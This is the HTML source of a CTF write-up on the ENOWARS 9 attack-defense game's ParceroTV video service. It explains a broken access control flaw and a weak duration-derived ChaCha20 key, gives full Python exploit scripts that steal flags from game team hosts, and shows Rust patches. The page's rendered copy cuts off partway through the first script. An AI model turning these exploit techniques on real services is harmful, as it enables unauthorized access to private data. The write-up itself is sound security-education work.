<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>ENOWARS 9 | Portfolio</title>
<meta name="keywords" content="attack-defense, ctf, crypto, web, enowars">
<meta name="description" content="Some writeups of the ENOWARS 9th edition.">
<meta name="author" content="AlBovo">
<link rel="canonical" href="https://albovo.github.io/en/ctf/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.d6fcd20a4fb86efa4dfac8ec95da60244cc8871042183da1ef28e3a762ad79c8.css" integrity="sha256-1vzSCk&#43;4bvpN&#43;sjsldpgJEzIhxBCGD2h7yjjp2Ktecg=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://albovo.github.io/%3Clink%20/%20abs%20url%3E">
<link rel="icon" type="image/png" sizes="16x16" href="https://albovo.github.io/%3Clink%20/%20abs%20url%3E">
<link rel="icon" type="image/png" sizes="32x32" href="https://albovo.github.io/%3Clink%20/%20abs%20url%3E">
<link rel="apple-touch-icon" href="https://albovo.github.io/%3Clink%20/%20abs%20url%3E">
<link rel="mask-icon" href="https://albovo.github.io/%3Clink%20/%20abs%20url%3E">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://albovo.github.io/en/ctf/enowars2025/">
<link rel="alternate" hreflang="it" href="https://albovo.github.io/it/ctf/enowars2025/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
<meta property="og:url" content="https://albovo.github.io/en/ctf/enowars2025/">
  <meta property="og:site_name" content="Portfolio">
  <meta property="og:title" content="ENOWARS 9">
  <meta property="og:description" content="Some writeups of the ENOWARS 9th edition.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="ctf">
    <meta property="article:published_time" content="2025-07-29T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-07-29T00:00:00+00:00">
    <meta property="article:tag" content="Attack-Defense">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Crypto">
    <meta property="article:tag" content="Web">
    <meta property="article:tag" content="Enowars">
    <meta property="og:image" content="https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups">
<meta name="twitter:title" content="ENOWARS 9">
<meta name="twitter:description" content="Some writeups of the ENOWARS 9th edition.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Capture The Flag üö©",
      "item": "https://albovo.github.io/en/ctf/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "ENOWARS 9",
      "item": "https://albovo.github.io/en/ctf/enowars2025/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "ENOWARS 9",
  "name": "ENOWARS 9",
  "description": "Some writeups of the ENOWARS 9th edition.",
  "keywords": [
    "attack-defense", "ctf", "crypto", "web", "enowars"
  ],
  "articleBody": "ENOWARS 9 üö© ParceroTV üåê Overview ParceroTV was a video-sharing web application, similar to a small-scale YouTube, built with a Rust backend using the Actix-web framework and a SQLite database. The service allowed users to register, log in, and upload videos and ‚Äúshorts.‚Äù Videos could be marked as public or private, and users could create playlists, comment on videos, and view other users‚Äô profiles. The application also featured a ‚Äúshorts‚Äù functionality with auto-generated captions in Spanish.\nAnalysis \u0026 Vulnerabilities The service contained two critical vulnerabilities: a Broken Access Control issue that allowed access to other users‚Äô private videos, and an insecure cryptography implementation in the shorts captioning system.\nVulnerability 1: Broken Access Control in Private Video API The primary vulnerability was found in the API endpoint responsible for retrieving a user‚Äôs private videos: /get_private_videos/{user_id}. The handler for this route took a user ID directly from the URL path and used it to query the database for all associated private videos.\nThe critical flaw was the complete lack of authorization checks. The code did not verify if the user_id provided in the URL matched the user_id of the currently authenticated user stored in the session. This meant that any logged-in user could enumerate and access the metadata of any other user‚Äôs private videos simply by guessing or obtaining their user ID.\nThis was made trivial by another endpoint, /get_user_info_with_name/{name}, which returned a user‚Äôs information, including their ID, based on their username.\nThe exploitation path was as follows:\nAn attacker registers a new account on the platform. The attacker uses the /get_user_info_with_name/{victim_username} endpoint to retrieve the victim‚Äôs unique user_id. The attacker then makes a request to /get_private_videos/{victim_user_id}. The API would improperly authorize this request and return a JSON object containing the metadata of all the victim‚Äôs private videos, one of which contained the flag hidden inside its description field, encoded using Brainfuck. Vulnerability 2: Insecure Cryptography in Shorts Captions The second vulnerability was in the ‚Äúshorts‚Äù feature. When a user uploaded a short with captions, the backend would ‚Äútranslate‚Äù them into Spanish and save them as a .vtt file. This process involved a custom encryption scheme.\nThe analysis of the NPI_hecker404_parceroTV_shorts.py exploit script and the backend source code (shorts_lib.rs) revealed that the encryption was critically flawed:\nPredictable Key Generation: The 256-bit ChaCha20 encryption key was derived directly from the short‚Äôs duration in seconds (a float value). This value was cast to milliseconds, and the resulting integer was used as a seed. This created an extremely small and predictable keyspace, making it trivial to brute-force the key by trying common duration values. Custom Encoding: Before encryption, the plaintext was encoded into a series of Spanish words using a fixed dictionary of 4096 words (spanish_words.txt). Each word represented a 12-bit chunk of the original data. The exploitation path was:\nThe attacker finds a target short with captions by querying the /get_shorts endpoint. They download the encrypted .vtt caption file. They reverse the Spanish word encoding to retrieve the raw ciphertext. They brute-force the video duration (the exploit script successfully used values like 4.6 and 2.5 seconds) to generate the correct ChaCha20 key. With the correct key, they decrypt the ciphertext to reveal the Brainfuck payload containing the flag. Exploits Here you can read the actual exploits I‚Äôve written with NPI.\n#!/bin/env python3 from pwn import * import requests import sys import json import string import random service_name = 'parceroTV' ip = sys.argv[1] alph = string.ascii_uppercase + string.digits if service_name: attacksjson = requests.get(f'https://9.enowars.com/scoreboard/attack.json').json() getid = attacksjson['services'][service_name][ip] def add_metadata(input_path: str, output_path: str, title: str = None, artist: str = None, genre: str = None) -\u003e None: cmd = [\"ffmpeg\", \"-i\", input_path] if title: cmd += [\"-metadata\", f\"title={title}\"] if artist: cmd += [\"-metadata\", f\"artist={artist}\"] if genre: cmd += [\"-metadata\", f\"genre={genre}\"] cmd += [\"-c\", \"copy\", output_path] subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) def brainfuck(input): ... return output def attack(fid=None): try: username_f = fid['0'][0] URL = f'http://{ip}:7777' assert username_f is not None, \"User ID must be set\" username, password = ''.join(random.choices(alph, k=12)), ''.join(random.choices(alph, k=12)) s = requests.Session() s.headers.update({'User-Agent': 'python-httpx/0.23.3', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}) s.get(URL) s.post(URL + '/newuser', data={'username': username, 'password': password}) s.post(URL + '/checkcredentials', data={'username': username, 'password': password}) userid = s.get(URL + f'/get_user_info_with_name/{username_f}').json()['id'] video = s.get(URL + f'/get_private_videos/{userid}').json()[0] a = f'metadata_{video['name']}_{''.join(random.choices(string.digits, k=4))}.mp4' m = [ video['name'], username_f, video['location'] ] add_metadata('video.mp4', a, title=m[0], artist=m[1], genre=m[2]) s.post(URL + '/app/create_video', data={ 'name': video['name'], 'description': os.urandom(12).hex(), 'is_private': 1, 'location': video['location'], }, files={ 'file': open(a, 'rb'), 'thumbnail': open('thumbnail.png', 'rb') }) print(f'{a}', flush=True) path = '/get_video_info/' + s.get(URL + '/get_my_videos').json()[0]['path'] print(brainfuck(s.get(URL + path).json()['description']), flush=True) except: pass if getid: for round in getid: attack(getid[round]) else: attack() And\n#!/usr/bin/env python3 import requests, re, sys, random, string from pathlib import Path from typing import List, Dict, Set from cryptography.hazmat.primitives.ciphers import Cipher, algorithms from cryptography.hazmat.backends import default_backend PER_LETTER = 4096 // 26 alph = string.ascii_uppercase + string.digits def brainfuck(input): ... return output def build_spanish_words(path: str = \"spanish_words.txt\") -\u003e List[bytes]: raw = Path(path).read_bytes() all_words = [w.strip() for w in raw.splitlines() if w.strip()] groups: Dict[bytes, List[bytes]] = {} for w in all_words: first = w[0:1].lower() if b'a' \u003c= first \u003c= b'z': groups.setdefault(first, []).append(w) used: Set[bytes] = set() result: List[bytes] = [] for letter_ord in range(ord(b'a'), ord(b'z') + 1): letter = bytes([letter_ord]) bucket = groups.get(letter, []) for w in bucket[:PER_LETTER]: if w not in used: used.add(w) result.append(w) for w in all_words: if len(result) \u003e= 4096: break if w not in used: used.add(w) result.append(w) if len(result) != 4096: raise ValueError(f\"Expected 4096 words, got {len(result)}\") return result def decrypt_spanish_stream( cipher_words: List[bytes], duration_secs: float, words_file: str = \"spanish_words.txt\" ) -\u003e str: table = build_spanish_words(words_file) inv_table = {w: i for i, w in enumerate(table)} bit_buf = 0 bit_count = 0 cipher_bytes = bytearray() for w in cipher_words: try: idx = inv_table[w] except KeyError: # This should not happen with the corrected byte handling continue if idx \u003e= 4096: raise ValueError(f\"Word index out of range: {idx}\") bit_buf = (bit_buf \u003c\u003c 12) | idx bit_count += 12 while bit_count \u003e= 8: bit_count -= 8 byte = (bit_buf \u003e\u003e bit_count) \u0026 0xFF cipher_bytes.append(byte) ms = int(round(duration_secs * 1000.0)) if ms == 0: ms = 1 seed = ms.to_bytes(8, \"little\") + b\"\\x00\" * 24 key = seed nonce = b\"\\x00\" * 16 cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend()).encryptor() keystream = cipher.update(b\"\\x00\" * len(cipher_bytes) * 8) plain_bytes = bytearray() for i, cb in enumerate(cipher_bytes): kb = keystream[i * 8] plain_bytes.append(cb ^ kb) return plain_bytes.decode(\"utf-8\", errors=\"ignore\") session = requests.Session() session.headers.update({'User-Agent': 'python-httpx/0.23.3', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}) def extract_vtt_text(vtt_content: bytes) -\u003e List[bytes]: lines = vtt_content.splitlines() text_lines = [] for line in lines: if re.match(br'^\\d+$', line): continue if re.match(br'^\\d{2}:\\d{2}:\\d{2}\\.\\d{3} --\u003e \\d{2}:\\d{2}:\\d{2}\\.\\d{3}$', line): continue if line.strip() == b\"\": continue if line.startswith(b'WEBVTT'): continue text_lines.append(line.strip()) # Join all text lines and then split into words full_text = b' '.join(text_lines) return full_text.split() assert len(sys.argv) == 2 TEAM_IP = sys.argv[1] service_name = 'parceroTV' attacksjson = requests.get(f'https://9.enowars.com/scoreboard/attack.json').json()['services'][service_name][TEAM_IP] URL = f'http://{TEAM_IP}:7777' for rnd in attacksjson.items(): vtt_file = rnd[1]['1'][0] username, password = ''.join(random.choices(alph, k=12)), ''.join(random.choices(alph, k=12)) session.get(URL) session.post(URL + '/newuser', data={'username': username, 'password': password}) session.post(URL + '/checkcredentials', data={'username': username, 'password': password}) r = session.get(URL + '/get_shorts').json() c = None for i in r: if i['name'] == vtt_file: c = i['caption_path'] break if c: vtt_raw = session.get(URL + c).content encrypted = extract_vtt_text(vtt_raw) durations = [4.6, 2.5] for d in durations: f = decrypt_spanish_stream(encrypted, d, words_file=\"spanish_words.txt\") if f.startswith('@') and f.endswith('@'): print(brainfuck(f), flush=True) Patches The staged git changes show that the Broken Access Control vulnerability was patched in backend/src/main.rs.\nPatch for Private Video Access: The get_private_videos_by_userid function was modified to include a crucial authorization check. It now compares the user_id from the session with the user_id from the URL. If they do not match, the request is rejected.\n--- a/backend/src/main.rs +++ b/backend/src/main.rs @@ -654,8 +654,11 @@ async fn get_private_videos_by_userid( pool: web::Data, user_id: web::Path, ) -\u003e Result { if let Ok(Some(_user_id)) = session.get::(\"user_id\") { - let conn = get_db_conn(\u0026pool).await?; let user_id = user_id.into_inner(); + if _user_id != user_id { + return Ok(redirect!(\"/no_permission\")); + } + let conn = get_db_conn(\u0026pool).await?; let videoss = web::block(move || select_private_videos_by_userid(conn, user_id)) .await? .map_err(error::ErrorInternalServerError)?; Defense-in-Depth for Video Info: A similar check was added to the /get_video_info/{path:.*} endpoint. This patch ensures that only the owner of a video can fetch its detailed metadata, preventing potential information leaks even if an attacker found another way to access a video path.\n--- a/backend/src/main.rs +++ b/backend/src/main.rs @@ -738,6 +741,9 @@ async fn get_video_info( let video_info = web::block(move || select_video_by_path(conn, \u0026path)) .await? .map_err(error::ErrorInternalServerError)?; + if video_info.userId != user_id { + return Ok(redirect!(\"/no_permission\")); + } Ok(HttpResponse::Ok().json(video_info)) } } else { No patches were found in the staged changes for the insecure cryptography vulnerability in the shorts captioning system. This suggests the vulnerability might have been overlooked or was intended to be patched in a different commit.\nNetwork-level Defense In addition to the code-level patches, we implemented a network-level defense. We configured our reverse proxy to inspect incoming HTTP requests. By identifying the specific User-Agent and other headers used by the game‚Äôs checker, we created a filtering rule. Any request to the service that did not match the checker‚Äôs header profile was blocked. This effectively mitigated simple scripted attacks and forced adversaries to craft more sophisticated exploits that correctly mimicked the checker‚Äôs traffic, as demonstrated by the User-Agent header present in the provided exploit scripts.\n",
  "wordCount" : "1531",
  "inLanguage": "en",
  "image":"https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups","datePublished": "2025-07-29T00:00:00Z",
  "dateModified": "2025-07-29T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "AlBovo"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://albovo.github.io/en/ctf/enowars2025/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Portfolio",
    "logo": {
      "@type": "ImageObject",
      "url": "https://albovo.github.io/%3Clink%20/%20abs%20url%3E"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://albovo.github.io/en/" accesskey="h" title="Home (Alt + H)">
                <img src="https://albovo.github.io/apple-touch-icon.png" alt="" aria-label="logo"
                    height="35">Home</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
                <ul class="lang-switch"><li>|</li>
                    <li>
                        <a href="https://albovo.github.io/it/" title="Italian"
                            aria-label=":it: It">üáÆüáπ It</a>
                    </li>
                </ul>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://albovo.github.io/en/projects/" title="üìí Projects">
                    <span>üìí Projects</span>
                </a>
            </li>
            <li>
                <a href="https://albovo.github.io/en/ctf/" title="‚öô Writeups">
                    <span>‚öô Writeups</span>
                </a>
            </li>
            <li>
                <a href="https://albovo.github.io/en/aoc/" title="üéÑ Advent of Code">
                    <span>üéÑ Advent of Code</span>
                </a>
            </li>
            <li>
                <a href="https://albovo.github.io/en/competitions/" title="üèÜ Competitions">
                    <span>üèÜ Competitions</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://albovo.github.io/en/">Home</a>&nbsp;¬ª&nbsp;<a href="https://albovo.github.io/en/ctf/">Capture The Flag üö©</a></div>
    <h1 class="post-title entry-hint-parent">
      ENOWARS 9
    </h1>
    <div class="post-description">
      Some writeups of the ENOWARS 9th edition.
    </div>
    <div class="post-meta"><span title='2025-07-29 00:00:00 +0000 UTC'>July 29, 2025</span>&nbsp;¬∑&nbsp;8 min&nbsp;¬∑&nbsp;1531 words&nbsp;¬∑&nbsp;AlBovo&nbsp;|&nbsp;Translations:
<ul class="i18n_list">
    <li>
        <a href="https://albovo.github.io/it/ctf/enowars2025/">üáÆüáπ It</a>
    </li>
</ul>&nbsp;|&nbsp;<a href="https://github.com/AlBovo/AlBovo.github.io/blob/main/content/en/ctf/enowars2025.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#parcerotv-">ParceroTV üåê</a>
      <ul>
        <li><a href="#overview">Overview</a></li>
        <li><a href="#analysis--vulnerabilities">Analysis &amp; Vulnerabilities</a></li>
        <li><a href="#exploits">Exploits</a></li>
        <li><a href="#patches">Patches</a></li>
        <li><a href="#network-level-defense">Network-level Defense</a></li>
      </ul>
    </li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="enowars-9-">ENOWARS 9 üö©<a hidden class="anchor" aria-hidden="true" href="#enowars-9-">#</a></h1>
<p><img alt="enowars logo" loading="lazy" src="/images/enowars.png"></p>
<h2 id="parcerotv-">ParceroTV üåê<a hidden class="anchor" aria-hidden="true" href="#parcerotv-">#</a></h2>
<h3 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h3>
<p><strong>ParceroTV</strong> was a video-sharing web application, similar to a small-scale YouTube, built with a <strong>Rust</strong> backend using the <strong>Actix-web</strong> framework and a <strong>SQLite</strong> database. The service allowed users to register, log in, and upload videos and &ldquo;shorts.&rdquo; Videos could be marked as public or private, and users could create playlists, comment on videos, and view other users&rsquo; profiles. The application also featured a &ldquo;shorts&rdquo; functionality with auto-generated captions in Spanish.</p>
<h3 id="analysis--vulnerabilities">Analysis &amp; Vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#analysis--vulnerabilities">#</a></h3>
<p>The service contained two critical vulnerabilities: a Broken Access Control issue that allowed access to other users&rsquo; private videos, and an insecure cryptography implementation in the shorts captioning system.</p>
<h4 id="vulnerability-1-broken-access-control-in-private-video-api">Vulnerability 1: Broken Access Control in Private Video API<a hidden class="anchor" aria-hidden="true" href="#vulnerability-1-broken-access-control-in-private-video-api">#</a></h4>
<p>The primary vulnerability was found in the API endpoint responsible for retrieving a user&rsquo;s private videos: <code>/get_private_videos/{user_id}</code>. The handler for this route took a user ID directly from the URL path and used it to query the database for all associated private videos.</p>
<p>The critical flaw was the <strong>complete lack of authorization checks</strong>. The code did not verify if the <code>user_id</code> provided in the URL matched the <code>user_id</code> of the currently authenticated user stored in the session. This meant that any logged-in user could enumerate and access the metadata of any other user&rsquo;s private videos simply by guessing or obtaining their user ID.</p>
<p>This was made trivial by another endpoint, <code>/get_user_info_with_name/{name}</code>, which returned a user&rsquo;s information, including their ID, based on their username.</p>
<p>The exploitation path was as follows:</p>
<ol>
<li>An attacker registers a new account on the platform.</li>
<li>The attacker uses the <code>/get_user_info_with_name/{victim_username}</code> endpoint to retrieve the victim&rsquo;s unique <code>user_id</code>.</li>
<li>The attacker then makes a request to <code>/get_private_videos/{victim_user_id}</code>.</li>
<li>The API would improperly authorize this request and return a JSON object containing the metadata of all the victim&rsquo;s private videos, one of which contained the flag hidden inside its description field, encoded using Brainfuck.</li>
</ol>
<h4 id="vulnerability-2-insecure-cryptography-in-shorts-captions">Vulnerability 2: Insecure Cryptography in Shorts Captions<a hidden class="anchor" aria-hidden="true" href="#vulnerability-2-insecure-cryptography-in-shorts-captions">#</a></h4>
<p>The second vulnerability was in the &ldquo;shorts&rdquo; feature. When a user uploaded a short with captions, the backend would &ldquo;translate&rdquo; them into Spanish and save them as a <code>.vtt</code> file. This process involved a custom encryption scheme.</p>
<p>The analysis of the <code>NPI_hecker404_parceroTV_shorts.py</code> exploit script and the backend source code (<code>shorts_lib.rs</code>) revealed that the encryption was critically flawed:</p>
<ol>
<li><strong>Predictable Key Generation</strong>: The 256-bit ChaCha20 encryption key was derived directly from the short&rsquo;s duration in seconds (a <code>float</code> value). This value was cast to milliseconds, and the resulting integer was used as a seed. This created an extremely small and predictable keyspace, making it trivial to brute-force the key by trying common duration values.</li>
<li><strong>Custom Encoding</strong>: Before encryption, the plaintext was encoded into a series of Spanish words using a fixed dictionary of 4096 words (<code>spanish_words.txt</code>). Each word represented a 12-bit chunk of the original data.</li>
</ol>
<p>The exploitation path was:</p>
<ol>
<li>The attacker finds a target short with captions by querying the <code>/get_shorts</code> endpoint.</li>
<li>They download the encrypted <code>.vtt</code> caption file.</li>
<li>They reverse the Spanish word encoding to retrieve the raw ciphertext.</li>
<li>They brute-force the video duration (the exploit script successfully used values like <code>4.6</code> and <code>2.5</code> seconds) to generate the correct ChaCha20 key.</li>
<li>With the correct key, they decrypt the ciphertext to reveal the Brainfuck payload containing the flag.</li>
</ol>
<h3 id="exploits">Exploits<a hidden class="anchor" aria-hidden="true" href="#exploits">#</a></h3>
<p>Here you can read the actual exploits I&rsquo;ve written with NPI.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">service_name</span> <span class="o">=</span> <span class="s1">&#39;parceroTV&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">ip</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">alph</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">service_name</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">attacksjson</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;https://9.enowars.com/scoreboard/attack.json&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">getid</span> <span class="o">=</span> <span class="n">attacksjson</span><span class="p">[</span><span class="s1">&#39;services&#39;</span><span class="p">][</span><span class="n">service_name</span><span class="p">][</span><span class="n">ip</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add_metadata</span><span class="p">(</span><span class="n">input_path</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                 <span class="n">output_path</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                 <span class="n">title</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                 <span class="n">artist</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                 <span class="n">genre</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="kc">None</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;ffmpeg&#34;</span><span class="p">,</span> <span class="s2">&#34;-i&#34;</span><span class="p">,</span> <span class="n">input_path</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">title</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">+=</span> <span class="p">[</span><span class="s2">&#34;-metadata&#34;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;title=</span><span class="si">{</span><span class="n">title</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">artist</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">+=</span> <span class="p">[</span><span class="s2">&#34;-metadata&#34;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;artist=</span><span class="si">{</span><span class="n">artist</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">genre</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">+=</span> <span class="p">[</span><span class="s2">&#34;-metadata&#34;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;genre=</span><span class="si">{</span><span class="n">genre</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">+=</span> <span class="p">[</span><span class="s2">&#34;-c&#34;</span><span class="p">,</span> <span class="s2">&#34;copy&#34;</span><span class="p">,</span> <span class="n">output_path</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">check</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">DEVNULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">brainfuck</span><span class="p">(</span><span class="nb">input</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="o">...</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">output</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">attack</span><span class="p">(</span><span class="n">fid</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">username_f</span> <span class="o">=</span> <span class="n">fid</span><span class="p">[</span><span class="s1">&#39;0&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">URL</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s1">:7777&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="n">username_f</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">,</span> <span class="s2">&#34;User ID must be set&#34;</span>
</span></span><span class="line"><span class="cl">
